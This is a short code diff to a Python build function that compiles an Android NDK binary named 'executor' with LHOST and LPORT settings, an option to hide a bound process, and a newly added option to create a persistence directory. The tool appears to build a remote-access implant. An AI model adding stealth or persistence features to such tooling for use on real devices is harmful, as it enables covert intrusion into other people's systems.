@@ -334,6 +334,8 @@ def build_binary(args):
         flags = f'B_EXECUTOR=1 B_64BIT=1 LPORT={config.get("lport") or ""} LHOST={config.get("lhost") or ""}'
         if config.get("hide_process_bind") == "1":
             flags += ' HIDE_PROCESS_BIND=1'
+        if config.get("create_persist_dir") == "1":
+            flags += ' CREATE_PERSIST_DIR=1'
         run_ndk_build(flags)
         clean_elf('executor')
 
